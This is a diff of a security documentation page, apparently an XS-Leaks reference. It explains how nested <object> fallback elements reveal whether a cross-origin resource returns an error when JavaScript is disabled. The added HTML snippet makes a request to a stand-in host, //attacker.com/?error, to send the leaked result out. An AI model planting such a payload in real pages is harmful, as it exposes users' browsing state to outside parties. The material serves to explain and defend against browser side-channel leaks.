@@ -114,8 +114,8 @@ window.Array.prototype.push = function() {
 If JavaScript is disabled it's still possible to leak some information about cross-origin resources. For example, an `<object>` can be used to detect whether a resource responds with *Error Code*. What happens is that if a resource `//example.org/resource` returns an error in `<object data=//example.org/resource>fallback</object>` then `fallback` will be rendered [^fallback] [^leaky-images]. It's possible to inject another `<object>` inside that will leak the information to an outside server, or detect it with CSS [^xsleaks-nojs].
 The below code embeds `//example.org/404` and if it responds with *Error* then a request to `//attacker.com/?error` is also made as a fallback.
 ```html
-<object data="https://example.com/404">
-<object data="https://example.org/?event=error"></object>
+<object data="//example.com/404">
+  <object data="//attacker.com/?error"></object>
 </object>
 ```
 
